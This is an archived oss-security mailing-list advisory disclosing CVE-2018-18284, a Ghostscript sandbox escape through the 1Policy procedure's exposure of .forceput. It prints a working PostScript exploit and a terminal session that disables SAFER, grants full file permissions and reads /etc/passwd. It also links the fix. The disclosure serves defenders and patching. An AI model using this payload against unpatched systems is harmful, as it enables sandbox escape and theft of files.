X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["2086" "Tuesday" "16" "October" "2018" "11:06:14" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>" "52" "[oss-security] ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284" "^Date:" nil nil "10" "2018101618:06:14" "[oss-security] ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284" (number mark "        taviso@googl Oct 16   52/2086  " thread-indent "\"[oss-security] ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 19790 invoked by uid 550); 16 Oct 2018 18:06:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 19766 invoked from network); 16 Oct 2018 18:06:39 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to;
        bh=wIGL0j1BhN/3w9lnVS11e1R5C6MpnJT2c3GM3E3oYpE=;
        b=dCwEZ0Vd/oWd9YVXiwOiL/rj6D5xLawK35fUOP29NhOaQdZOyqC0KGoSPh/e5XU+mb
         7rTOHslvdY9oe0XzG0iZPGDWKCTx/j4tXzpiHu9nXeq06ZR+mPpFfIIHA/P2MHjMLBAv
         Y0PA8AVYuMXhloPrwPsOdghdnVHMAF7ZNvzWM4As1BlJJ/DI/9BqKO0Bjc0la33+xomR
         wUOeGL4iybixxpHq1qUPRLvR1/5aeGShgBIDCLhEssMdDhZNtIL0H3TxBpZkIacsl+i5
         nPVNn8L9W2wYiJzS+BNKETDhsW6GSsFHEv2g0nqKPWA0vQ7ASXKLB/wf68G83sbR6NyA
         XQ7w==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
        bh=wIGL0j1BhN/3w9lnVS11e1R5C6MpnJT2c3GM3E3oYpE=;
        b=talfM0IH0NyzqS1e6Q9hqbJ4QJ8EjM6OfUqF8KBmwFoq849kK40qzUgnLsRctc3dVf
         9NkrFHbjq4H5ahzIclVceRmeLx/noAA81WFRqVLNW8J6Gz1mzi9Q7+0RtjdyV7VMf/Wt
         JLYUqGRIkKPw+G9Y55KEw1FGUw9aHygXOxJ8Qe83hNF6fO4XYkBw3/LlwI+oVXJ/LIf5
         v0Nx+BLJU5L17VIflxfY8kNoQAAHgpc4fN17+sKluGr0PClyNnVCXAqVQhElyHNpvh0A
         AQ9R5YYZa/BLZxYKz2Bt02E4cT/A6kVP72jktbmqWaeN9A6XJ5enTCG1jQAfWL5A+qh4
         sIbw==
X-Gm-Message-State: ABuFfog5snwaCU6ne/wX3gatS95oOInRCdlQ5Nyh+0yaQtXxhXwl5Ozu
	5bOJERqoikkoXoGTWxN7lvE5AqOIduuMAy4eZrsLrvinsPJurw==
X-Google-Smtp-Source: ACcGV62vGPomla3HmaDXFJqj2wHVrETA6q5GEKs68d6+x+pXJbaOx36hbpX76NGBenf/QMjh0DQaobKe01NApf4HPYQ=
X-Received: by 2002:aed:2f01:: with SMTP id l1-v6mr21216911qtd.71.1539713187009;
 Tue, 16 Oct 2018 11:06:27 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAJ_zFk+P0WurjfHK3bQZ7fSuiFRYeAz+GrpQCn2F3SJPx3z=Cw@mail.gmail.com>
Content-Type: multipart/alternative; boundary="0000000000009208c205785c69d7"
Date: Tue, 16 Oct 2018 11:06:14 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] ghostscript: 1Policy operator gives access to .forceput CVE-2018-18284
To: oss-security@lists.openwall.com

--0000000000009208c205785c69d7
Content-Type: text/plain; charset="UTF-8"

Hello, this <https://bugs.chromium.org/p/project-zero/issues/detail?id=1696>
is CVE-2018-18284, another ghostscript sandbox escape. Because procedures
in postscript are just executable arrays, all system procedures need to be
marked as executeonly, so that users cannot peek at their internals with
array operators.

We have also recently learned that they must be marked as pseudo-operators,
otherwise their contents might leak to error handlers.

That makes sense, unless the procedure itself is dangerous - in that case
it must be hidden.

1Policy is a procedure that was correctly marked as executeonly and made a
pseudo-operator, but was basically just a wrapper around .forceput. Here is
how to exploit it:

/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1 get
exec pop pop pop pop pop pop pop } def

Once you have access to .forceput, you can basically do whatever you want,
see the exploit for CVE-2018-17961 a full example of backdooring .bashrc.

Here is a simpler repro, just reading /etc/passwd:

$ gs -dSAFER -sDEVICE=ppmraw
GPL Ghostscript 9.25 (2018-09-13)
Copyright (C) 2018 Artifex Software, Inc.  All rights reserved.
This software comes with NO WARRANTY: see the file PUBLIC for details.
GS>/.forceput { <<>> <<>> 4 index (ignored) 5 index 5 index .policyprocs 1
get exec pop pop pop pop pop pop pop } def
GS>systemdict /SAFER false .forceput
GS>systemdict /userparams get /PermitFileControl [(*)] .forceput
GS>systemdict /userparams get /PermitFileWriting [(*)] .forceput
GS>systemdict /userparams get /PermitFileReading [(*)] .forceput
GS>(/etc/passwd) (r) file 1024 string readline pop ==
(root:x:0:0:root:/root:/bin/bash)
GS>

This patch solves it:

http://git.ghostscript.com/?p=ghostpdl.git;h=8d19fdf63f91f50466b08f23e2d93d37a4c5ea0b

Side note: I'm done looking at ghostscript for now, but still *strongly*
recommend that we deprecate untrusted postscript and disable ghostscript
coders by default in policy.xml.

Thanks, Tavis.

--0000000000009208c205785c69d7--
